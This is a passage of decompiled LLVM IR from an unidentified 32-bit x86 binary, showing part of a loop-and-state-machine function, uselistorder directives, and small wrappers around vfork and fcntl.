  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e737 = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e737 = inttoptr i32 %v3_804e737 to i8*
  store i8 1, i8* %v4_804e737, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e741:                             ; preds = %dec_label_pc_804e6c9
  store i8 6, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e761:                             ; preds = %dec_label_pc_804da88
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  %v1_804e779 = add i32 %v2_804da50, 24
  store i32 %v1_804e779, i32* %eax.global-to-local, align 4
  %v1_804e77c = inttoptr i32 %v1_804e779 to i32*
  %v2_804e77c = load i32, i32* %v1_804e77c, align 4
  store i32 %v2_804e77c, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e794 = inttoptr i32 %v2_804da50 to i32*
  %v4_804e794 = load i32, i32* %v3_804e794, align 4
  store i32 %v4_804e794, i32* %eax.global-to-local, align 4
  %v0_804e797 = load i32, i32* @esp, align 4
  %v1_804e797 = add i32 %v0_804e797, 16
  %v2_804e797 = inttoptr i32 %v1_804e797 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805e0c0.297 to i32), i32* %v2_804e797, align 4
  %v0_804e79f = load i32, i32* @esp, align 4
  %v1_804e79f = add i32 %v0_804e79f, 12
  %v2_804e79f = inttoptr i32 %v1_804e79f to i32*
  store i32 512, i32* %v2_804e79f, align 4
  %v0_804e7a7 = load i32, i32* @ebx, align 4
  %v1_804e7a7 = load i32, i32* @esp, align 4
  %v2_804e7a7 = add i32 %v1_804e7a7, 8
  %v3_804e7a7 = inttoptr i32 %v2_804e7a7 to i32*
  store i32 %v0_804e7a7, i32* %v3_804e7a7, align 4
  %v0_804e7ab = load i32, i32* @esp, align 4
  %v1_804e7ab = add i32 %v0_804e7ab, 4
  %v2_804e7ab = inttoptr i32 %v1_804e7ab to i32*
  store i32 10000, i32* %v2_804e7ab, align 4
  %v0_804e7b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7b3 = load i32, i32* @esp, align 4
  %v2_804e7b3 = inttoptr i32 %v1_804e7b3 to i32*
  store i32 %v0_804e7b3, i32* %v2_804e7b3, align 4
  %v1_804e7b6 = call i32 @function_804855e(i32 %v6_804da9e)
  store i32 %v1_804e7b6, i32* %eax.global-to-local, align 4
  %v1_804e7bb = icmp eq i32 %v1_804e7b6, 0
  br i1 %v1_804e7bb, label %dec_label_pc_804e8e6, label %dec_label_pc_804e7c3

dec_label_pc_804e7c3:                             ; preds = %dec_label_pc_804e761
  store i32 %storemerge39, i32* @ebx, align 4
  %v0_804e7c6 = load i32, i32* @esp, align 4
  %v1_804e7c6 = inttoptr i32 %v0_804e7c6 to i32*
  store i32 0, i32* %v1_804e7c6, align 4
  %v1_804e7cd = inttoptr i32 %stack_var_-628.238 to i32*
  %v2_804e7cd = call i32 @function_8050ed8(i32* %v1_804e7cd)
  store i32 %v2_804e7cd, i32* @esi, align 4
  %v0_804e7d7 = load i32, i32* @ebx, align 4
  %v2_804e7e7 = mul i32 %v0_804e7d7, 28
  %v1_804e7eb = add i32 %v2_804e7e9, %v2_804e7e7
  %v2_804e7ee = inttoptr i32 %v1_804e7eb to i32*
  store i32 %v2_804e7cd, i32* %v2_804e7ee, align 4
  store i32 %v1_804da40, i32* @edx, align 4
  store i32 %v1_804e779, i32* %eax.global-to-local, align 4
  %v2_804e80b = load i32, i32* %v1_804e77c, align 4
  store i32 %v2_804e80b, i32* %eax.global-to-local, align 4
  %v1_804e80d = load i32, i32* @esp, align 4
  %v2_804e80d = inttoptr i32 %v1_804e80d to i32*
  store i32 %v2_804e80b, i32* %v2_804e80d, align 4
  %v1_804e810 = call i32 @function_8048448(i32 %stack_var_-628.238)
  %v1_804e815 = icmp eq i32 %v1_804e810, 0
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e815, label %dec_label_pc_804e839, label %dec_label_pc_804e819

dec_label_pc_804e819:                             ; preds = %dec_label_pc_804e7c3
  store i8 0, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e839:                             ; preds = %dec_label_pc_804e7c3
  %v3_804e84f = add i32 %v2_804dbcf, %v2_804da4e
  %v4_804e84f = inttoptr i32 %v3_804e84f to i8*
  %v5_804e84f = load i8, i8* %v4_804e84f, align 1
  %v6_804e84f = zext i8 %v5_804e84f to i32
  store i32 %v6_804e84f, i32* %eax.global-to-local, align 4
  %v1_804e857 = mul nuw nsw i32 %v6_804e84f, 4
  %v2_804e857 = add nuw nsw i32 %v1_804e857, 134603136
  %v3_804e857 = inttoptr i32 %v2_804e857 to i32*
  %v4_804e857 = load i32, i32* %v3_804e857, align 4
  store i32 %v4_804e857, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e874 = add i32 %v2_804dc16, %v2_804da4e
  %v4_804e874 = inttoptr i32 %v3_804e874 to i8*
  %v5_804e874 = load i8, i8* %v4_804e874, align 2
  %v6_804e874 = zext i8 %v5_804e874 to i32
  store i32 %v6_804e874, i32* %eax.global-to-local, align 4
  %v1_804e87c = mul nuw nsw i32 %v6_804e874, 4
  %v2_804e87c = add nuw nsw i32 %v1_804e87c, 134603072
  %v3_804e87c = inttoptr i32 %v2_804e87c to i32*
  %v4_804e87c = load i32, i32* %v3_804e87c, align 4
  store i32 %v4_804e87c, i32* @esi, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da50, i32* %eax.global-to-local, align 4
  %v1_804e89c = load i32, i32* @esp, align 4
  %v2_804e89c = inttoptr i32 %v1_804e89c to i32*
  store i32 %v2_804da50, i32* %v2_804e89c, align 4
  %v0_804e89f = call i32 @function_80485c6()
  store i32 %v0_804e89f, i32* %eax.global-to-local, align 4
  %v0_804e8a4 = load i32, i32* @global_var_805e8c0.32, align 64
  store i32 %v0_804e8a4, i32* %edx.global-to-local, align 4
  %v0_804e8aa = load i32, i32* @ebx, align 4
  %v1_804e8aa = load i32, i32* @esp, align 4
  %v2_804e8aa = add i32 %v1_804e8aa, 16
  %v3_804e8aa = inttoptr i32 %v2_804e8aa to i32*
  store i32 %v0_804e8aa, i32* %v3_804e8aa, align 4
  %v0_804e8ae = load i32, i32* @esi, align 4
  %v1_804e8ae = load i32, i32* @esp, align 4
  %v2_804e8ae = add i32 %v1_804e8ae, 12
  %v3_804e8ae = inttoptr i32 %v2_804e8ae to i32*
  store i32 %v0_804e8ae, i32* %v3_804e8ae, align 4
  %v1_804e8b2 = load i32, i32* @esp, align 4
  %v2_804e8b2 = add i32 %v1_804e8b2, 8
  %v3_804e8b2 = inttoptr i32 %v2_804e8b2 to i32*
  store i32 %v0_804e89f, i32* %v3_804e8b2, align 4
  %v0_804e8b6 = load i32, i32* @esp, align 4
  %v1_804e8b6 = add i32 %v0_804e8b6, 4
  %v2_804e8b6 = inttoptr i32 %v1_804e8b6 to i32*
  store i32 ptrtoint (i32* @global_var_805b690.298 to i32), i32* %v2_804e8b6, align 4
  %v0_804e8be = load i32, i32* %edx.global-to-local, align 4
  %v1_804e8be = load i32, i32* @esp, align 4
  %v2_804e8be = inttoptr i32 %v1_804e8be to i32*
  store i32 %v0_804e8be, i32* %v2_804e8be, align 4
  %v2_804e8c1 = call i32 @function_8048c7c(i32 %stack_var_-628.238, i32 %stack_var_-624.237)
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  store i8 7, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e8e6:                             ; preds = %dec_label_pc_804e761
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v1_804da52, i32* %eax.global-to-local, align 4
  %v2_804e901 = load i32, i32* %v1_804da55, align 4
  store i32 %v2_804e901, i32* %eax.global-to-local, align 4
  %v1_804e903 = add i32 %v2_804e901, 7
  store i32 %v1_804e903, i32* @ebx, align 4
  %v0_804e906 = load i32, i32* @esp, align 4
  %v1_804e906 = inttoptr i32 %v0_804e906 to i32*
  store i32 0, i32* %v1_804e906, align 4
  %v1_804e90d = inttoptr i32 %stack_var_-628.238 to i32*
  %v2_804e90d = call i32 @function_8050ed8(i32* %v1_804e90d)
  store i32 %v2_804e90d, i32* %eax.global-to-local, align 4
  %v0_804e912 = load i32, i32* @ebx, align 4
  %v7_804e912 = icmp ult i32 %v0_804e912, %v2_804e90d
  %v1_804e914 = icmp eq i1 %v7_804e912, false
  br i1 %v1_804e914, label %dec_label_pc_804eb34, label %dec_label_pc_804e91a

dec_label_pc_804e91a:                             ; preds = %dec_label_pc_804e8e6
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e94b = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e94b = inttoptr i32 %v3_804e94b to i8*
  store i8 1, i8* %v4_804e94b, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e955:                             ; preds = %dec_label_pc_804da88
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e96b = inttoptr i32 %v2_804da50 to i32*
  %v4_804e96b = load i32, i32* %v3_804e96b, align 4
  store i32 %v4_804e96b, i32* %eax.global-to-local, align 4
  %v0_804e96e = load i32, i32* @esp, align 4
  %v1_804e96e = add i32 %v0_804e96e, 12
  %v2_804e96e = inttoptr i32 %v1_804e96e to i32*
  store i32 16384, i32* %v2_804e96e, align 4
  %v0_804e976 = load i32, i32* @esp, align 4
  %v1_804e976 = add i32 %v0_804e976, 8
  %v2_804e976 = inttoptr i32 %v1_804e976 to i32*
  store i32 425, i32* %v2_804e976, align 4
  %v0_804e97e = load i32, i32* @esp, align 4
  %v1_804e97e = add i32 %v0_804e97e, 4
  %v2_804e97e = inttoptr i32 %v1_804e97e to i32*
  store i32 ptrtoint ([485 x i8]* @global_var_805b6d0.299 to i32), i32* %v2_804e97e, align 4
  %v0_804e986 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e986 = load i32, i32* @esp, align 4
  %v2_804e986 = inttoptr i32 %v1_804e986 to i32*
  store i32 %v0_804e986, i32* %v2_804e986, align 4
  %v4_804e989 = call i32 @function_8052758(i32 %v6_804da9e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_804e98e = icmp slt i32 %v4_804e989, 0
  %v1_804e990 = icmp eq i1 %v2_804e98e, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e990, label %dec_label_pc_804e9cd, label %dec_label_pc_804e992

dec_label_pc_804e992:                             ; preds = %dec_label_pc_804e955
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e9c3 = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e9c3 = inttoptr i32 %v3_804e9c3 to i8*
  store i8 1, i8* %v4_804e9c3, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e9cd:                             ; preds = %dec_label_pc_804e955
  store i8 8, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e9ed:                             ; preds = %dec_label_pc_804da88
  store i32 %storemerge39, i32* @ebx, align 4
  %v0_804e9f0 = load i32, i32* @esp, align 4
  %v1_804e9f0 = inttoptr i32 %v0_804e9f0 to i32*
  store i32 0, i32* %v1_804e9f0, align 4
  %v1_804e9f7 = inttoptr i32 %v6_804da9e to i32*
  %v2_804e9f7 = call i32 @function_8050ed8(i32* %v1_804e9f7)
  store i32 %v2_804e9f7, i32* @esi, align 4
  %v0_804ea01 = load i32, i32* @ebx, align 4
  %v2_804ea11 = mul i32 %v0_804ea01, 28
  %v1_804ea15 = add i32 %v2_804e7e9, %v2_804ea11
  %v2_804ea18 = inttoptr i32 %v1_804ea15 to i32*
  store i32 %v2_804e9f7, i32* %v2_804ea18, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804ea30 = inttoptr i32 %v2_804da50 to i32*
  %v4_804ea30 = load i32, i32* %v3_804ea30, align 4
  store i32 %v4_804ea30, i32* %eax.global-to-local, align 4
  %v0_804ea33 = load i32, i32* @esp, align 4
  %v1_804ea33 = add i32 %v0_804ea33, 12
  %v2_804ea33 = inttoptr i32 %v1_804ea33 to i32*
  store i32 16384, i32* %v2_804ea33, align 4
  %v0_804ea3b = load i32, i32* @esp, align 4
  %v1_804ea3b = add i32 %v0_804ea3b, 8
  %v2_804ea3b = inttoptr i32 %v1_804ea3b to i32*
  store i32 425, i32* %v2_804ea3b, align 4
  %v0_804ea43 = load i32, i32* @esp, align 4
  %v1_804ea43 = add i32 %v0_804ea43, 4
  %v2_804ea43 = inttoptr i32 %v1_804ea43 to i32*
  store i32 ptrtoint ([485 x i8]* @global_var_805b6d0.299 to i32), i32* %v2_804ea43, align 4
  %v0_804ea4b = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea4b = load i32, i32* @esp, align 4
  %v2_804ea4b = inttoptr i32 %v1_804ea4b to i32*
  store i32 %v0_804ea4b, i32* %v2_804ea4b, align 4
  %v4_804ea4e = call i32 @function_8052758(i32 %stack_var_-628.238, i32 %stack_var_-624.237, i32 %v2_804d971, i32 %v6_804da9e)
  %v2_804ea53 = icmp slt i32 %v4_804ea4e, 0
  %v1_804ea55 = icmp eq i1 %v2_804ea53, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804ea55, label %dec_label_pc_804eab3, label %dec_label_pc_804ea57

dec_label_pc_804ea57:                             ; preds = %dec_label_pc_804e9ed
  %v4_804ea6d = load i32, i32* %v3_804ea30, align 4
  store i32 %v4_804ea6d, i32* %eax.global-to-local, align 4
  %v1_804ea70 = load i32, i32* @esp, align 4
  %v2_804ea70 = inttoptr i32 %v1_804ea70 to i32*
  store i32 %v4_804ea6d, i32* %v2_804ea70, align 4
  %v1_804ea73 = call i32 @function_804d879(i32 %stack_var_-628.238)
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804eaa9 = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804eaa9 = inttoptr i32 %v3_804eaa9 to i8*
  store i8 1, i8* %v4_804eaa9, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804eab3:                             ; preds = %dec_label_pc_804e9ed
  %v3_804eac9 = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804eac9 = inttoptr i32 %v3_804eac9 to i8*
  store i8 3, i8* %v4_804eac9, align 1
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v1_804da52, i32* %eax.global-to-local, align 4
  %v2_804eae9 = load i32, i32* %v1_804da55, align 4
  store i32 %v2_804eae9, i32* %eax.global-to-local, align 4
  %v1_804eaeb = add i32 %v2_804eae9, 60
  store i32 %v1_804eaeb, i32* @ebx, align 4
  %v0_804eaee = load i32, i32* @esp, align 4
  %v1_804eaee = inttoptr i32 %v0_804eaee to i32*
  store i32 0, i32* %v1_804eaee, align 4
  %v1_804eaf5 = inttoptr i32 %stack_var_-628.238 to i32*
  %v2_804eaf5 = call i32 @function_8050ed8(i32* %v1_804eaf5)
  store i32 %v2_804eaf5, i32* %eax.global-to-local, align 4
  %v0_804eafa = load i32, i32* @ebx, align 4
  %v7_804eafa = icmp ult i32 %v0_804eafa, %v2_804eaf5
  %v1_804eafc = icmp eq i1 %v7_804eafa, false
  br i1 %v1_804eafc, label %dec_label_pc_804eb34, label %dec_label_pc_804eafe

dec_label_pc_804eafe:                             ; preds = %dec_label_pc_804eab3
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804eac9, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804eb34:                             ; preds = %dec_label_pc_804da88, %dec_label_pc_804eab3, %dec_label_pc_804e8e6, %dec_label_pc_804e583, %dec_label_pc_804e2de, %dec_label_pc_804e187, %dec_label_pc_804dcc3, %dec_label_pc_804ea57, %dec_label_pc_804e9cd, %dec_label_pc_804e992, %dec_label_pc_804e91a, %dec_label_pc_804e839, %dec_label_pc_804e819, %dec_label_pc_804e741, %dec_label_pc_804e706, %dec_label_pc_804e68e, %dec_label_pc_804e5b7, %dec_label_pc_804e563, %dec_label_pc_804e543, %dec_label_pc_804e49c, %dec_label_pc_804e461, %dec_label_pc_804e3e9, %dec_label_pc_804e312, %dec_label_pc_804e2be, %dec_label_pc_804e29e, %dec_label_pc_804e1bb, %dec_label_pc_804e12b, %dec_label_pc_804e025, %dec_label_pc_804dfc9, %dec_label_pc_804de61, %dec_label_pc_804de20, %dec_label_pc_804dca3, %dec_label_pc_804dc64, %dec_label_pc_804eafe
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.237, %dec_label_pc_804da88 ], [ %stack_var_-624.237, %dec_label_pc_804eab3 ], [ %stack_var_-624.237, %dec_label_pc_804eafe ], [ %stack_var_-624.237, %dec_label_pc_804ea57 ], [ %stack_var_-624.237, %dec_label_pc_804e9cd ], [ %stack_var_-624.237, %dec_label_pc_804e992 ], [ %stack_var_-624.237, %dec_label_pc_804e8e6 ], [ %stack_var_-624.237, %dec_label_pc_804e91a ], [ %stack_var_-624.237, %dec_label_pc_804e839 ], [ %stack_var_-624.237, %dec_label_pc_804e819 ], [ %stack_var_-624.237, %dec_label_pc_804e741 ], [ %stack_var_-624.237, %dec_label_pc_804e706 ], [ %stack_var_-624.237, %dec_label_pc_804e68e ], [ %stack_var_-624.237, %dec_label_pc_804e583 ], [ %stack_var_-624.237, %dec_label_pc_804e5b7 ], [ %stack_var_-624.237, %dec_label_pc_804e563 ], [ %stack_var_-624.237, %dec_label_pc_804e543 ], [ %v4_804e36b, %dec_label_pc_804e49c ], [ %v4_804e36b, %dec_label_pc_804e461 ], [ %v4_804e36b, %dec_label_pc_804e3e9 ], [ %stack_var_-624.237, %dec_label_pc_804e2de ], [ %stack_var_-624.237, %dec_label_pc_804e312 ], [ %stack_var_-624.237, %dec_label_pc_804e2be ], [ %stack_var_-624.237, %dec_label_pc_804e29e ], [ %stack_var_-624.237, %dec_label_pc_804e187 ], [ %stack_var_-624.237, %dec_label_pc_804e1bb ], [ %stack_var_-624.237, %dec_label_pc_804e12b ], [ %stack_var_-624.237, %dec_label_pc_804e025 ], [ %stack_var_-624.237, %dec_label_pc_804dfc9 ], [ %stack_var_-624.237, %dec_label_pc_804dcc3 ], [ %stack_var_-624.237, %dec_label_pc_804de61 ], [ %stack_var_-624.237, %dec_label_pc_804de20 ], [ %stack_var_-624.237, %dec_label_pc_804dca3 ], [ %stack_var_-624.237, %dec_label_pc_804dc64 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.238, %dec_label_pc_804da88 ], [ %stack_var_-628.238, %dec_label_pc_804eab3 ], [ %stack_var_-628.238, %dec_label_pc_804eafe ], [ %stack_var_-628.238, %dec_label_pc_804ea57 ], [ %stack_var_-628.238, %dec_label_pc_804e9cd ], [ %stack_var_-628.238, %dec_label_pc_804e992 ], [ %stack_var_-628.238, %dec_label_pc_804e8e6 ], [ %stack_var_-628.238, %dec_label_pc_804e91a ], [ %stack_var_-628.238, %dec_label_pc_804e839 ], [ %stack_var_-628.238, %dec_label_pc_804e819 ], [ %v4_804e610, %dec_label_pc_804e741 ], [ %v4_804e610, %dec_label_pc_804e706 ], [ %v4_804e610, %dec_label_pc_804e68e ], [ %stack_var_-628.238, %dec_label_pc_804e583 ], [ %stack_var_-628.238, %dec_label_pc_804e5b7 ], [ %stack_var_-628.238, %dec_label_pc_804e563 ], [ %stack_var_-628.238, %dec_label_pc_804e543 ], [ %stack_var_-628.238, %dec_label_pc_804e49c ], [ %stack_var_-628.238, %dec_label_pc_804e461 ], [ %stack_var_-628.238, %dec_label_pc_804e3e9 ], [ %stack_var_-628.238, %dec_label_pc_804e2de ], [ %stack_var_-628.238, %dec_label_pc_804e312 ], [ %stack_var_-628.238, %dec_label_pc_804e2be ], [ %stack_var_-628.238, %dec_label_pc_804e29e ], [ %stack_var_-628.238, %dec_label_pc_804e187 ], [ %stack_var_-628.238, %dec_label_pc_804e1bb ], [ %stack_var_-628.238, %dec_label_pc_804e12b ], [ %stack_var_-628.238, %dec_label_pc_804e025 ], [ %stack_var_-628.238, %dec_label_pc_804dfc9 ], [ %stack_var_-628.238, %dec_label_pc_804dcc3 ], [ %stack_var_-628.238, %dec_label_pc_804de61 ], [ %stack_var_-628.238, %dec_label_pc_804de20 ], [ %stack_var_-628.238, %dec_label_pc_804dca3 ], [ %stack_var_-628.238, %dec_label_pc_804dc64 ]
  %v4_804eb34 = add nuw nsw i32 %storemerge39, 1
  %v15_804eb3a = icmp eq i32 %v4_804eb34, 512
  br i1 %v15_804eb3a, label %dec_label_pc_804da2e, label %dec_label_pc_804da3a

; uselistorder directives
  uselistorder i32 %v4_804eb34, { 1, 0, 2 }
  uselistorder i32 %v0_804e03e, { 1, 0 }
  uselistorder i32 %v5_804df54, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804def2, { 1, 0 }
  uselistorder i32 %v2_804ded6, { 1, 0 }
  uselistorder i32 %v2_804db06, { 1, 0 }
  uselistorder i32 %v6_804da9e, { 9, 10, 8, 7, 5, 6, 4, 2, 3, 1, 0, 12, 11, 13 }
  uselistorder i8* %v4_804da9e, { 22, 23, 20, 21, 17, 18, 19, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 24 }
  uselistorder i32* %v1_804da55, { 6, 5, 4, 3, 1, 2, 0, 7 }
  uselistorder i32 %v1_804da52, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v2_804da50, { 21, 20, 17, 16, 18, 19, 15, 12, 13, 14, 11, 8, 9, 10, 5, 6, 7, 0, 1, 3, 2, 4, 22 }
  uselistorder i32 %v2_804da4e, { 23, 0, 1, 22, 24, 25, 2, 26, 27, 28, 3, 32, 29, 5, 30, 4, 31, 33, 6, 35, 36, 7, 34, 37, 38, 39, 8, 40, 9, 42, 41, 43, 10, 45, 46, 11, 44, 47, 48, 49, 12, 50, 13, 52, 51, 53, 14, 60, 61, 15, 59, 62, 55, 56, 16, 54, 57, 58, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 18, 75, 17, 76, 77, 19, 78, 20, 79, 21 }
  uselistorder i32 %v1_804da40, { 1, 2, 0, 3, 4, 5, 6, 7, 13, 14, 8, 9, 10, 11, 12, 15, 16, 18, 19, 17, 20, 21, 22, 23, 25, 24, 26, 27, 28, 30, 31, 29, 32, 33, 34, 35, 37, 36, 38, 39, 40, 48, 49, 47, 50, 42, 43, 44, 41, 45, 46, 51, 52, 53, 56, 54, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder i32 %stack_var_-624.237, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 16, 15, 14, 11, 10, 8, 7, 6, 5, 4, 3, 2, 0, 1, 9, 13, 12, 17, 20 }
  uselistorder i32 %stack_var_-628.238, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 11, 10, 8, 7, 6, 4, 3, 0, 2, 5, 1, 9, 14, 13, 12 }
  uselistorder i32 %storemerge39, { 2, 3, 4, 5, 6, 7, 9, 8, 0, 1 }
  uselistorder i32 %v4_804da1f, { 1, 0, 2 }
  uselistorder i32 %storemerge141, { 1, 0 }
  uselistorder i32 %v2_804d9fa, { 1, 0, 2, 3, 5, 4, 6, 8, 7, 9, 12, 11, 10, 13, 14 }
  uselistorder i32 %v2_804d971, { 11, 13, 12, 15, 14, 4, 5, 6, 7, 16, 0, 1, 2, 8, 3, 9, 10 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 0, 3, 2, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-320, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-328, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-192, { 2, 1, 4, 0, 6, 5, 3, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 6, 5, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 19, 18, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 72, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95 }
  uselistorder i32* %eax.global-to-local, { 2, 5, 3, 4, 7, 8, 6, 9, 10, 11, 13, 12, 14, 15, 16, 17, 20, 18, 19, 21, 23, 22, 24, 25, 26, 27, 28, 29, 32, 30, 31, 33, 34, 36, 35, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 52, 50, 51, 54, 55, 56, 53, 57, 58, 59, 60, 62, 61, 63, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 78, 76, 77, 80, 81, 82, 79, 83, 84, 85, 86, 87, 88, 89, 92, 90, 91, 94, 95, 93, 96, 97, 98, 99, 100, 101, 102, 105, 103, 104, 106, 107, 109, 108, 110, 111, 112, 113, 115, 114, 116, 117, 118, 119, 120, 123, 121, 122, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 142, 157, 158, 159, 160, 161, 162, 163, 0, 176, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 1, 177, 178, 179, 180, 182, 181 }
  uselistorder i32 (i32, i32)* @function_8048c7c, { 1, 0 }
  uselistorder i8* bitcast ([10 x i8*]* @global_var_80578ae.11 to i8*), { 1, 0 }
  uselistorder i32 (i32)* @function_8048448, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804855e, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_80526e8, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_8050e18, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804d879, { 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i8 5, { 1, 0 }
  uselistorder i32 2560, { 1, 0 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_80482f9, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804eb34, { 33, 1, 7, 8, 9, 10, 2, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804da88, { 1, 0 }
  uselistorder label %dec_label_pc_804da3a, { 1, 0 }
  uselistorder label %dec_label_pc_804d9a6, { 1, 0 }
}

define i32 @function_8050a24(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050a24:
  %v0_8050a2a = call i32 @vfork()
  %v5_8050a2d = icmp ult i32 %v0_8050a2a, -4095
  %v1_8050a32 = icmp eq i1 %v5_8050a2d, false
  call void @__pseudo_cond_branch(i1 %v1_8050a32, i32 134562680)
  ret i32 %v0_8050a2a
}

define i32 @function_8050a3c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050a3c:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8050a3c = load i32, i32* @edi, align 4
  %v0_8050a3d = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8050a55 = add i32 %arg2, -12
  %v6_8050a5b = icmp ugt i32 %v1_8050a55, 2
  br i1 %v6_8050a5b, label %dec_label_pc_8050a6b, label %dec_label_pc_8050a5d

dec_label_pc_8050a5d:                             ; preds = %dec_label_pc_8050a3c
  %v4_8050a61 = call i32 @function_8050a94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8050a55)
  br label %dec_label_pc_8050a8d

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a3c
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050a73 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8050a73, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050a73, -4095
